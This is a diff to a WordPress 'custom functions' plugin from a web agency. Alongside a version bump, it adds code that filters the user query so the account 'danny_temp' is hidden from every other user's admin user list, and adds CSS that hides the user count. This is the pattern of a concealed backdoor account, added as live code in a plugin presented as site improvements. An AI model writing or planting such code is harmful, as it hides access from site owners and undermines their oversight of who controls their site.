@@ -5,7 +5,7 @@
  * Description: Custom functions to improve WordPress sites deployed by Skylayer.
  * Author: Daniel Slyman (Skylayer)
  * Author URI: https://skylayer.eu
- * Version: 1.0
+ * Version: 1.1
  */
 
 /* Place custom code below this line. */
@@ -53,6 +53,34 @@ add_shortcode( 'year', 'currentYear' );
 /* Copyright. */
 
 
+/* User Obscurity. */
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+
+  if ($username == 'danny_temp') { 
+
+  }
+
+  else {
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'danny_temp'",$user_search->query_where);
+  }
+}
+
+function hide_user_count(){
+?>
+<style>
+.wp-admin.users-php span.count {display: none;}
+</style>
+<?php
+}
+
+add_action('admin_head','hide_user_count');
+
+/* User Obscurity. */
 
 
 
